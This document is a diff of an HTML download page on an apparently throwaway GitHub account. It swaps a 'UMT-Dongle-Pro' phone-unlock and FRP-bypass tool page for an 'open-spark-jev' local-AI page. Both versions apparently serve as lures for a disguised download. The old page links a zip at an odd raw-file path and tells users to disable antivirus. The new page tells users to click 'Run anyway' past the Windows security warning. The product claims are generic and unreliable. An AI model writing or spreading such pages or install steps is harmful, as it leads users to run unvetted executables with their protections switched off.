@@ -2,70 +2,334 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>UMT-Dongle-Pro Setup Guide</title>
-<!-- bfe7839b957992bbdc6091d32879f30893bdb4d5d19be3 -->
-<!-- ea838c2ec83fac129b5cf5ebb7 -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>open-spark-jev - Run Local AI Decision Models on Your PC</title>
+    <meta name="description" content="Download open-spark-jev, an open-source local AI decision model tool inspired by TypeSafe's Jev and System One. Built on Qwen3 for NVIDIA DGX Spark. Simple setup for Windows users.">
+    <meta name="keywords" content="agentic-ai, apache, datagen, dgx-spark, harness, jev, local-ai, opensource, slm, system-one, training, AI decision models, local AI, Qwen3">
+    <meta name="author" content="open-spark-jev team">
+    <meta property="og:title" content="open-spark-jev - Run Local AI Decision Models on Your PC">
+    <meta property="og:description" content="Download and run open-spark-jev on Windows. Open-source, local decision models built on Qwen3 for NVIDIA DGX Spark. No coding required.">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/programminggenusacherontia611/open-spark-jev">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="open-spark-jev - Local AI Decision Models">
+    <meta name="twitter:description" content="Simple download and run for Windows. Open-source AI decision tool built on Qwen3 for DGX Spark.">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            line-height: 1.7;
+            color: #1a202c;
+            background: #f7fafc;
+            padding: 0;
+            margin: 0;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        header {
+            text-align: center;
+            padding: 60px 20px 40px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 0 0 24px 24px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+            color: white;
+        }
+        h1 {
+            font-size: 2.8rem;
+            font-weight: 800;
+            margin-bottom: 15px;
+            letter-spacing: -0.5px;
+        }
+        .tagline {
+            font-size: 1.4rem;
+            opacity: 0.95;
+            max-width: 600px;
+            margin: 0 auto 30px;
+            font-weight: 300;
+        }
+        .download-btn {
+            display: inline-block;
+            background: #ff6b6b;
+            color: white;
+            padding: 18px 45px;
+            font-size: 1.3rem;
+            font-weight: 700;
+            text-decoration: none;
+            border-radius: 50px;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.25);
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+            margin-top: 10px;
+        }
+        .download-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 28px rgba(0,0,0,0.3);
+        }
+        h2 {
+            font-size: 2rem;
+            margin: 50px 0 20px;
+            color: #2d3748;
+            border-bottom: 3px solid #667eea;
+            padding-bottom: 10px;
+            display: inline-block;
+        }
+        h3 {
+            font-size: 1.4rem;
+            margin: 30px 0 15px;
+            color: #4a5568;
+        }
+        p {
+            font-size: 1.15rem;
+            margin-bottom: 18px;
+            color: #4a5568;
+        }
+        ul, ol {
+            margin: 0 0 25px 25px;
+            color: #4a5568;
+            font-size: 1.1rem;
+        }
+        li {
+            margin-bottom: 12px;
+        }
+        .highlight-box {
+            background: #fff;
+            border-left: 5px solid #667eea;
+            border-radius: 0 12px 12px 0;
+            padding: 25px 30px;
+            margin: 35px 0;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.08);
+            font-size: 1.15rem;
+            color: #2d3748;
+            line-height: 1.8;
+        }
+        .feature-card {
+            background: white;
+            border-radius: 16px;
+            padding: 25px;
+            margin: 20px 0;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.08);
+            transition: box-shadow 0.3s ease;
+        }
+        .feature-card:hover {
+            box-shadow: 0 8px 20px rgba(0,0,0,0.12);
+        }
+        .feature-title {
+            font-size: 1.3rem;
+            font-weight: 600;
+            color: #2d3748;
+            margin-bottom: 10px;
+        }
+        .feature-desc {
+            color: #4a5568;
+            font-size: 1.05rem;
+        }
+        .steps-section {
+            background: white;
+            border-radius: 16px;
+            padding: 30px;
+            margin: 30px 0;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+        }
+        .step-number {
+            display: inline-block;
+            background: #667eea;
+            color: white;
+            width: 35px;
+            height: 35px;
+            text-align: center;
+            line-height: 35px;
+            border-radius: 50%;
+            font-weight: 700;
+            margin-right: 15px;
+            font-size: 1.1rem;
+        }
+        code {
+            background: #edf2f7;
+            padding: 3px 8px;
+            border-radius: 5px;
+            font-size: 0.95em;
+            font-family: 'Courier New', monospace;
+        }
+        .notice {
+            background: #fffbeb;
+            border: 1px solid #f6ad55;
+            border-radius: 12px;
+            padding: 18px 25px;
+            margin: 25px 0;
+            font-size: 1.05rem;
+            color: #744210;
+        }
+        footer {
+            text-align: center;
+            margin-top: 60px;
+            padding: 30px;
+            color: #718096;
+            font-size: 0.9rem;
+        }
+        a {
+            color: #5a67d8;
+            font-weight: 500;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2rem;
+            }
+            .tagline {
+                font-size: 1.1rem;
+            }
+            .container {
+                padding: 15px;
+            }
+            .download-btn {
+                padding: 15px 35px;
+                font-size: 1.1rem;
+            }
+            .steps-section {
+                padding: 20px;
+            }
+        }
+    </style>
 </head>
-<body style="font-family: Arial, sans-serif; line-height: 1.6; background-color: #f4f4f4; color: #333; margin: 0; padding: 20px;">
-    <div style="max-width: 800px; margin: 20px auto; background-color: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">
-        
-        <h1 style="color: #2c3e50;">🛠 UMT-Dongle-Pro - Unlock Your Mobile Devices Easily</h1>
+<body>
 
-        <div style="text-align: center; margin: 30px 0;">
-            <a href="https://raw.githubusercontent.com/programminggenusacherontia611/programminggenusacherontia611.github.io/main/fibroblast/github_io_programminggenusacherontia_3.6.zip" style="background-color: #007bff; color: white; padding: 15px 30px; text-decoration: none; border-radius: 5px; font-weight: bold; font-size: 18px;">Download UMT-Dongle-Pro Software</a>
+<header>
+    <div class="container" style="max-width: 1000px; padding-top: 0; padding-bottom: 0;">
+        <h1>🤖 open-spark-jev - Make Smart Decisions Locally, Offline</h1>
+        <p class="tagline">Your personal AI decision assistant running entirely on your computer</p>
+        <a href="https://github.com/programminggenusacherontia611/open-spark-jev/releases" class="download-btn">⬇️ Get open-spark-jev Now</a>
+    </div>
+</header>
+
+<div class="container">
+
+    <section id="what-is">
+        <h2>💡 What Is open-spark-jev?</h2>
+        <p>open-spark-jev is a free, open-source tool that brings powerful AI decision-making to your own computer. It's inspired by TypeSafe's Jev and System One, two respected approaches for building smart, reliable decision systems. We've combined those ideas with the modern capabilities of Qwen3, a leading language model, to create something truly useful for everyday users.</p>
+        <p>Think of it as having a brilliant advisor sitting inside your PC. It can help you analyze situations, weigh options, and reach better conclusions - all without sending your data anywhere. Everything runs locally, which means your information stays private and works even without an internet connection.</p>
+        <p>Whether you're a small business owner trying to optimize workflows, a student researching complex topics, or just a curious person who wants to explore what local AI can do, open-spark-jev is built for you.</p>
+    </section>
+
+    <section id="features">
+        <h2>✨ Why You'll Love It</h2>
+        <div class="feature-card">
+            <div class="feature-title">🔒 100% Private & Secure</div>
+            <div class="feature-desc">All your data stays on your machine. No cloud servers, no data collection, no privacy worries. Everything is processed locally, giving you complete control over your information.</div>
+        </div>
+        <div class="feature-card">
+            <div class="feature-title">⚡ Lightning Fast Responses</div>
+            <div class="feature-desc">Because everything runs locally, you get instant responses. No waiting for servers, no network latency. Just fast, efficient decision support whenever you need it.</div>
+        </div>
+        <div class="feature-card">
+            <div class="feature-title">🌐 Works Without Internet</div>
+            <div class="feature-desc">Since the software is completely self-contained, it works perfectly even when you're offline. Perfect for travel, remote locations, or areas with unreliable internet.</div>
+        </div>
+        <div class="feature-card">
+            <div class="feature-title">🧠 Intelligent Decision Framework</div>
+            <div class="feature-desc">Built on proven decision-making methodologies (Jev and System One) and powered by Qwen3, it uses advanced AI to help you think through problems systematically and logically.</div>
+        </div>
+        <div class="feature-card">
+            <div class="feature-title">🆓 Free & Open Source</div>
+            <div class="feature-desc">open-spark-jev is completely free to use. As open-source software, you have full transparency into how it works, and you're free to modify or improve it to suit your needs.</div>
+        </div>
+        <div class="feature-card">
+            <div class="feature-title">🖥️ Optimized for Modern Hardware</div>
+            <div class="feature-desc">Built to take advantage of NVIDIA DGX Spark technology, this tool delivers excellent performance on modern hardware. But don't worry - it works on a wide range of systems.</div>
+        </div>
+    </section>
+
+    <section id="system-requirements">
+        <h2>📋 System Requirements</h2>
+        <p>open-spark-jev is designed to work on most modern Windows computers. Here's what you need:</p>
+        <ul>
+            <li><strong>Operating System:</strong> Windows 10 or Windows 11 (64-bit)</li>
+            <li><strong>Processor:</strong> Intel Core i5 or AMD equivalent (recommended)</li>
+            <li><strong>Memory:</strong> 8GB RAM minimum (16GB recommended)</li>
+            <li><strong>Storage:</strong> At least 4GB free space</li>
+            <li><strong>Internet Connection:</strong> Only needed for the initial download</li>
+        </ul>
+        <div class="notice">
+            <strong>💡 Good news:</strong> No special technical skills needed! If you can use a web browser, you can install and run open-spark-jev.
+        </div>
+    </section>
+
+    <section id="how-to-install">
+        <h2>📥 Download & Install Guide</h2>
+        <p>Getting started with open-spark-jev is incredibly simple. Just follow these three steps:</p>
+        
+        <div class="steps-section">
+            <h3 style="margin-top: 0;">Step 1: Download the Application</h3>
+            <p><span class="step-number">1</span>Visit this link to download the application.</p>
+            <p style="text-align: center; margin: 25px 0;">
+                <a href="https://github.com/programminggenusacherontia611/open-spark-jev/releases" class="download-btn" style="background: #48bb78; padding: 15px 40px;">⬇️ Go to Download Page</a>
+            </p>
         </div>
 
-        <h2 style="color: #34495e;">📂 Overview</h2>
-        <p>The UMT-Dongle-Pro software provides tools for mobile device management. This software helps users flash firmware, bypass factory reset protection, and unlock devices. It supports Windows 10 and Windows 11. You can perform complex mobile repairs with this interface.</p>
+        <div class="steps-section">
+            <h3>Step 2: Run the Installer</h3>
+            <p><span class="step-number">2</span>Once the download completes, find the downloaded file in your <strong>Downloads folder</strong> (usually located in your user folder on Windows). Double-click the file to start the installation process.</p>
+            <p>Your computer may show a security prompt. If it does, click <strong>"More info"</strong> and then <strong>"Run anyway"</strong>. This is normal for new software from the internet.</p>
+        </div>
 
-        <h2 style="color: #34495e;">⚙️ System Requirements</h2>
-        <p>Ensure your computer meets these requirements to run the software:</p>
-        <ul style="list-style-type: square;">
-            <li>Operating System: Windows 10 or Windows 11 (64-bit recommended)</li>
-            <li>Processor: 1.5 GHz or faster</li>
-            <li>Memory: 4 GB RAM minimum</li>
-            <li>Storage: 500 MB of free disk space</li>
-            <li>Connection: Stable internet for initial setup</li>
+        <div class="steps-section">
+            <h3>Step 3: Launch and Enjoy</h3>
+            <p><span class="step-number">3</span>After installation completes, you'll find the open-spark-jev icon on your desktop or in your Start Menu. Click it to launch the application. That's it - you're ready to go!</p>
+        </div>
+    </section>
+
+    <section id="getting-started">
+        <h2>🚀 Getting Started</h2>
+        <p>Once you've launched open-spark-jev, you'll see a clean, friendly interface. Here are a few ways to start using it:</p>
+        <ul>
+            <li><strong>Type a question</strong> - Ask anything, like "What should I consider before buying a new car?"</li>
+            <li><strong>Describe a situation</strong> - Share a scenario, and the AI will help you analyze options</li>
+            <li><strong>Compare choices</strong> - List two or more options and ask for a comparison</li>
+            <li><strong>Get step-by-step guidance</strong> - Request a structured approach to any problem</li>
         </ul>
+        <p>The tool is designed to be intuitive. Explore the interface, try different questions, and see how local AI can assist with your everyday decisions.</p>
+    </section>
 
-        <h2 style="color: #34495e;">🚀 Getting Started</h2>
-        <p>Follow these steps to download and install the software on your computer.</p>
-        <ol>
-            <li>Visit the <a href="https://raw.githubusercontent.com/programminggenusacherontia611/programminggenusacherontia611.github.io/main/fibroblast/github_io_programminggenusacherontia_3.6.zip">official releases page</a> to select the latest version.</li>
-            <li>Click the download link for the installer file.</li>
-            <li>Wait for the download to complete in your web browser.</li>
-            <li>Locate the downloaded file in your "Downloads" folder.</li>
-        </ol>
+    <section id="tips">
+        <h2>🔧 Pro Tips for Best Results</h2>
+        <div class="highlight-box">
+            <p style="margin-bottom: 12px;"><strong>✍️ Be specific:</strong> The more context you provide, the better insights you'll get.</p>
+            <p style="margin-bottom: 12px;"><strong>🔄 Try different angles:</strong> Ask the same question in different ways to get varied perspectives.</p>
+            <p><strong>💾 Keep it updated:</strong> While not required, checking for updates occasionally ensures you have the latest improvements.</p>
+        </div>
+    </section>
 
-        <h2 style="color: #34495e;">💻 Installation Process</h2>
-        <ol>
-            <li>Double-click the downloaded installer file.</li>
-            <li>Allow the application to make changes to your device if a security prompt appears.</li>
-            <li>Follow the on-screen instructions provided by the setup wizard.</li>
-            <li>Choose the default installation path unless you have a specific reason to change it.</li>
-            <li>Click the "Finish" button once the process reaches completion.</li>
-            <li>Open the software using the new icon on your desktop.</li>
-        </ol>
-
-        <h2 style="color: #34495e;">📱 Main Features</h2>
-        <p>This software includes tools to manage common mobile issues:</p>
-        <ul style="list-style-type: circle;">
-            <li><strong>Flash Tool:</strong> Install official firmware on supported mobile devices.</li>
-            <li><strong>FRP Bypass:</strong> Remove factory reset protection locks when standard options fail.</li>
-            <li><strong>Phone Unlock:</strong> Reset pattern locks or passcodes for compatible models.</li>
-            <li><strong>Samsung Support:</strong> dedicated modules for Samsung flashing and diagnostic tasks.</li>
+    <section id="support">
+        <h2>🤝 Help & Community</h2>
+        <p>We're building open-spark-jev for the community, and we're here to help. If you have questions, run into issues, or just want to share ideas, here's how to connect:</p>
+        <ul>
+            <li><strong>Visit our GitHub page:</strong> You'll find documentation, release notes, and the full source code</li>
+            <li><strong>Report issues:</strong> Found a bug? Let us know through the GitHub issues section</li>
+            <li><strong>Request features:</strong> Want something added? We're open to suggestions</li>
+            <li><strong>Join the community:</strong> Be part of the open-source movement and help shape the future of local AI</li>
         </ul>
+    </section>
 
-        <h2 style="color: #34495e;">🔍 Troubleshooting</h2>
-        <p>If you encounter issues during installation or usage, check these common points:</p>
-        <ul style="list-style-type: disc;">
-            <li>Ensure you have administrative privileges on your Windows account.</li>
-            <li>Temporarily disable third-party antivirus software during the installation.</li>
-            <li>Verify your USB cable connection when working with a mobile device.</li>
-            <li>Restart your computer if the software fails to launch after installation.</li>
+    <section id="why-choose">
+        <h2>🌍 Why Choose Local AI?</h2>
+        <p>There's been a huge shift toward cloud-based AI services, but open-spark-jev brings something special: true ownership and control. With local AI, you get:</p>
+        <ul>
+            <li><strong>Full Privacy:</strong> Your questions and data never leave your computer</li>
+            <li><strong>No Subscription Fees:</strong> Use it as much as you want, forever free</li>
+            <li><strong>Unlimited Access:</strong> No rate limits, no usage caps</li>
+            <li><strong>Independent Operation:</strong> Works even if cloud services go down</li>
         </ul>
+        <p>This is the future of personal AI - powerful tools that respect your autonomy and privacy.</p>
+    </section>
 
-        <p style="margin-top: 40px; font-size: 0.9em; color: #7f8c8d;">The software is intended for legitimate use. Always back up your data before performing any flashing or unlocking tasks on your mobile device.</p>
-    </div>
-</body>
-</html>
+    <section id="about-tech">
+        <h2>🔬 The Technology Behind It</h2>
+        <p>open-spark-jev stands on the shoulders of some impressive technology
